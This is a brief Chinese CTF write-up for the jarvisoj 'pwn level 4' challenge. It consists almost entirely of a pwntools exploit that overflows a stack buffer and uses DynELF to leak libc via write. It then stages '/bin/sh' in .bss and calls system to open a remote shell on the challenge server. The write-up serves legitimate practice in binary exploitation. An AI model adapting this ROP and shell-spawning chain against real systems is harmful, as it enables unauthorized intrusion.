jarvisoj pwn level 4

level 4

checksec 是x86的题目用IDA打开没有libc文件，通过查询知道了一个DynELF，可以泄露出libc从哪里开始的。
下面是EXP：

from pwn import *

re = remote("pwn2.jarvisoj.com",9880)
elf = ELF('./level4')
write_plt = elf.symbols['write']
vul_addr=0x804844b
bss_addr=0x0804a024

def leak(address):
        payload = 'a'*0x88 + 'a'*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
        re.sendline(payload)
        data = re.recv(4)
        return data
wow = DynELF(leak,elf=elf)
system_addr = wow.lookup('system','libc')
read_plt = elf.symbols['read']

payload2 = 'a'*0x88 + 'a'*4 + p32(read_plt) + p32(vul_addr) + p32(1) + p32(bss_addr) + p32(8)
re.sendline(payload2)
re.send('/bin/sh\x00')
payload3 = 'a'*0x88 +'a'*4 + p32(system_addr) +p32(0) + p32(bss_addr)
re.sendline(payload3)
re.interactive()
